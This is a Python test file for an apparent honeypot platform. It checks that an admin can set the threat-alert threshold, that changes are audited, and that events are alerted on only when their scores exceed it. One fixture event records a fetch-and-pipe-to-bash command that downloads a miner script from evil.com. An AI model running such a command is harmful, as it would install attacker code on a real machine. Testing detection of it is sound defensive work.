import json
import httpx
from app.honeymind import HoneyMind
from app.models import Event, SystemSetting
from app.orchestrator import Orchestrator
from app.scoring import get_threat_alert_threshold, set_threat_alert_threshold, _score_event
from .conftest import fresh, login_and_enroll, csrf


def test_threat_threshold_lifecycle_and_audit(app):
    client = fresh(app)
    _, me = login_and_enroll(client, "admin")
    h = csrf(me)

    # 1. Получение текущего порога (дефолт 60)
    res = client.get("/api/settings/threat-threshold")
    assert res.status_code == 200
    data = res.json()
    assert data["threshold"] == 60
    assert len(data["presets"]) == 4

    # 2. Обновление порога через API
    res_up = client.put("/api/settings/threat-threshold", json={"threshold": 80}, headers=h)
    assert res_up.status_code == 200
    assert res_up.json()["threshold"] == 80
    assert res_up.json()["previous"] == 60

    # 3. Проверка, что значение сохранилось в БД и функции
    with app.state.session_factory() as db:
        setting = db.get(SystemSetting, "threat_alert_threshold")
        assert setting is not None
        assert setting.value == "80"
        assert get_threat_alert_threshold(db) == 80

    # 4. Проверка журнала аудита
    res_audit = client.get("/api/audit", headers=h)
    assert res_audit.status_code == 200
    actions = [i["action"] for i in res_audit.json()["items"]]
    assert "threat_threshold.update" in actions

    # 5. Внутренний API для оркестратора / Telegram
    orch_token = app.state.settings.orchestrator_token or "orch-token-123"
    app.state.settings.orchestrator_token = orch_token
    i_headers = {"X-Internal-Token": orch_token}

    i_get = client.get("/api/internal/settings/threat-threshold", headers=i_headers)
    assert i_get.status_code == 200
    assert i_get.json()["threshold"] == 80

    i_set = client.post("/api/internal/settings/threat-threshold", json={"threshold": 75}, headers=i_headers)
    assert i_set.status_code == 200
    assert i_set.json()["threshold"] == 75

    with app.state.session_factory() as db:
        assert get_threat_alert_threshold(db) == 75


def test_custom_threshold_filters_alerts(app):
    client = fresh(app)
    _, me = login_and_enroll(client, "admin")
    h = csrf(me)

    # Мокаем HoneyMind и Orchestrator
    verdict = {"threat_score": 70, "category": "reconnaissance", "is_human": None, "needs_review": False}
    app.state.honeymind = HoneyMind(
        app.state.settings.model_copy(update={"honeymind_url": "http://hm.internal", "honeymind_token": "t"}),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=verdict))
    )

    notified = []
    def orch_handler(req: httpx.Request):
        notified.append(json.loads(req.content or b"{}"))
        return httpx.Response(200, json={"status": "sent"})

    app.state.orchestrator = Orchestrator(
        app.state.settings.model_copy(update={"orchestrator_url": "http://orch.internal", "orchestrator_token": "s"}),
        transport=httpx.MockTransport(orch_handler)
    )

    # Устанавливаем высокий порог 85
    client.put("/api/settings/threat-threshold", json={"threshold": 85}, headers=h)

    # Создаём ловушку и событие со скором 70 (меньше порога 85 -> алерта быть не должно)
    t = client.post("/api/traps", json={"name": "trap-threshold-test"}, headers=h).json()


    with app.state.session_factory() as db:
        from datetime import datetime, timezone
        ev = Event(
            uid="test-ev-threshold-1",
            trap_id=t["id"],
            ts=datetime.now(timezone.utc).replace(tzinfo=None),
            type="command",
            src_ip="198.51.100.5",
            command="ls -la",
        )
        db.add(ev)
        db.commit()
        ev_view = {"id": ev.id, "type": ev.type, "src_ip": ev.src_ip, "command": ev.command}

    _score_event(app.state.session_factory, app.state.honeymind, app.state.orchestrator, ev_view)
    assert len(notified) == 0  # Скор 70 < 85 -> алерт отсечён спам-фильтром

    # А теперь событие со скором 90 (>= 85 -> алерт должен уйти)
    verdict["threat_score"] = 90
    with app.state.session_factory() as db:
        ev2 = Event(
            uid="test-ev-threshold-2",
            trap_id=t["id"],
            ts=datetime.now(timezone.utc).replace(tzinfo=None),
            type="command",
            src_ip="198.51.100.5",
            command="wget http://evil.com/miner.sh | bash",
        )
        db.add(ev2)
        db.commit()
        ev2_view = {"id": ev2.id, "type": ev2.type, "src_ip": ev2.src_ip, "command": ev2.command}

    _score_event(app.state.session_factory, app.state.honeymind, app.state.orchestrator, ev2_view)
    assert len(notified) == 1
    assert notified[0]["properties"]["threat_score"] == 90
